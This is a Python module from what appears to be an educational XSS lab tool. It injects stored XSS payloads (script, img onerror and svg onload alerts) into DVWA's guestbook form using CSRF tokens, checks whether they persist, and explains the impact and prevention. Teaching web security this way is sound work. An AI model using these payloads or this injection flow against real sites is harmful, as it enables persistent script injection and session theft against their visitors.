"""
Stored XSS module for XSS Lab Tool.
Demonstrates and teaches stored (persistent) XSS attacks.
"""

from typing import Optional
from ..explanations.text_blocks import XSSExplanations


class StoredXSSModule:
    """Interactive module for teaching Stored XSS."""

    def __init__(self, http_client, logger, target_config, auth):
        """
        Initialize Stored XSS module.

        Args:
            http_client: HTTPClient instance
            logger: DualLogger instance
            target_config: TargetConfig instance
            auth: DVWAAuthenticator instance (for CSRF tokens)
        """
        self.http = http_client
        self.logger = logger
        self.config = target_config
        self.auth = auth
        self.explanations = XSSExplanations()

        # DVWA stored XSS page path
        self.xss_stored_path = "vulnerabilities/xss_s/"

        # Payloads for stored XSS
        self.payloads = [
            ("<script>alert('Stored XSS')</script>", "Basic script injection"),
            ("<img src=x onerror=alert('XSS')>", "Image error handler"),
            ("<svg/onload=alert('XSS')>", "SVG onload event"),
        ]

    def run_interactive(self, interactive: bool = True) -> bool:
        """
        Run the stored XSS module interactively.

        Args:
            interactive: If True, pause for user confirmation at key steps

        Returns:
            True if at least one payload succeeded
        """
        self.logger.educational("", "STORED XSS MODULE")
        self.logger.educational(self.explanations.STORED_XSS_INTRO)

        # Step 1: Introduce the vulnerability
        self.logger.step(
            1,
            "Understanding Stored XSS",
            "We're going to examine DVWA's Stored XSS page (Guestbook). This page allows\n"
            "users to post messages that are stored in a database and displayed to all visitors.\n\n"
            "If the application doesn't sanitize input properly, we can store malicious\n"
            "JavaScript that will execute for EVERY user who views the page."
        )

        if interactive and not self._get_user_approval("Proceed to examine the guestbook?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 2: View current guestbook entries
        self.logger.step(
            2,
            "Viewing Current Guestbook Entries",
            "First, let's see what's currently in the guestbook."
        )

        url = self.config.get_dvwa_url(self.xss_stored_path)
        response = self.http.get(url)

        if not response:
            self.logger.explain_failure(
                "Failed to reach guestbook page",
                "The HTTP request to the stored XSS page failed.",
                "Verify DVWA is running and you're authenticated"
            )
            return False

        self.logger.educational("✓ Successfully accessed guestbook page")

        # Step 3: Explain the attack flow
        self.logger.educational(self.explanations.STORED_XSS_IMPACT)

        if interactive and not self._get_user_approval("\nProceed to attempt stored XSS injection?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 4: Attempt to inject stored XSS
        success = False
        for i, (payload, description) in enumerate(self.payloads, start=1):
            if self._attempt_stored_payload(payload, description, i, interactive):
                success = True
                break  # Stop after first success

        # Step 5: Prevention education
        if success:
            self.logger.educational("\n" + "="*70)
            self.logger.educational(self.explanations.STORED_XSS_PREVENTION)

        return success

    def _attempt_stored_payload(self, payload: str, description: str, attempt_num: int, interactive: bool) -> bool:
        """
        Attempt to store and trigger an XSS payload.

        Args:
            payload: The XSS payload to store
            description: Description of the payload
            attempt_num: Attempt number
            interactive: Whether to ask for confirmation

        Returns:
            True if payload succeeded
        """
        self.logger.step(
            3 + attempt_num,
            f"Stored XSS Attempt {attempt_num}",
            f"Let's try storing this payload in the guestbook:"
        )

        self.logger.payload(payload, description)

        if interactive and not self._get_user_approval(f"\nStore this payload in the guestbook?"):
            self.logger.educational("Payload skipped by user.\n")
            return False

        # Step A: Submit the payload
        self.logger.educational("\n→ Submitting payload to guestbook...")

        url = self.config.get_dvwa_url(self.xss_stored_path)

        # Get CSRF token for the form
        csrf_token = self.auth.get_csrf_token(url)

        # Prepare form data
        form_data = {
            'txtName': 'XSS Test User',
            'mtxMessage': payload,
            'btnSign': 'Sign Guestbook'
        }

        if csrf_token:
            form_data['user_token'] = csrf_token

        # Submit the payload
        response = self.http.post(url, data=form_data)

        if not response:
            self.logger.explain_failure(
                f"Failed to submit payload {attempt_num}",
                "HTTP POST request failed",
                "Check connection to DVWA"
            )
            return False

        self.logger.educational("✓ Payload submitted successfully")

        # Step B: Retrieve the page to see if payload is stored and executed
        self.logger.educational("\n→ Retrieving guestbook to check if payload persists...")

        response = self.http.get(url)

        if not response:
            self.logger.explain_failure(
                "Failed to retrieve guestbook after submission",
                "Could not verify if payload was stored",
                "Try accessing the page manually"
            )
            return False

        # Check if payload appears in response
        if payload in response.text:
            self.logger.explain_success(
                f"Stored XSS payload {attempt_num} succeeded!",
                f"The payload '{payload}' is now PERMANENTLY stored in the database.\n\n"
                f"Critical difference from Reflected XSS:\n"
                f"  - Reflected: Victim must click malicious link\n"
                f"  - Stored: EVERY visitor automatically affected\n\n"
                f"Attack timeline:\n"
                f"  1. Attacker stores malicious script (just happened)\n"
                f"  2. Script is saved to database\n"
                f"  3. ANY user who views this page executes the script\n"
                f"  4. No further action needed from attacker\n\n"
                f"In a real scenario, this could:\n"
                f"  - Steal session cookies from all visitors\n"
                f"  - Create a worm (script that posts itself)\n"
                f"  - Redirect users to phishing pages\n"
                f"  - Modify page content for all users"
            )
            return True
        else:
            # Check if it's encoded
            encoded_check = payload.replace('<', '&lt;').replace('>', '&gt;')
            if encoded_check in response.text:
                self.logger.explain_failure(
                    f"Payload {attempt_num} was stored but ENCODED",
                    "The payload was saved to the database, but when displayed, special\n"
                    "characters were encoded (< becomes &lt;, > becomes &gt;).\n\n"
                    "This is actually GOOD security practice - it prevents XSS while\n"
                    "preserving the data. The current DVWA security level is doing output encoding.",
                    f"Try a different payload or lower security level" if attempt_num < len(self.payloads) else None
                )
            else:
                self.logger.explain_failure(
                    f"Payload {attempt_num} may have been filtered",
                    "The payload does not appear in the response at all, suggesting:\n"
                    "  - Input filtering removed dangerous strings\n"
                    "  - Payload was rejected before storage\n"
                    "  - Higher security level prevented storage",
                    f"Try alternative payload" if attempt_num < len(self.payloads) else None
                )

        return False

    def _get_user_approval(self, prompt: str) -> bool:
        """
        Ask user for approval to proceed.

        Args:
            prompt: Prompt to display

        Returns:
            True if user approves, False otherwise
        """
        try:
            response = input(f"\n{prompt} [y/N]: ").strip().lower()
            self.logger.operational(f"User response to '{prompt}': {response}", "INFO")
            return response in ['y', 'yes']
        except (KeyboardInterrupt, EOFError):
            self.logger.operational("User interrupted", "INFO")
            return False

    def get_target_url(self) -> str:
        """Get the full URL for the stored XSS page."""
        return self.config.get_dvwa_url(self.xss_stored_path)
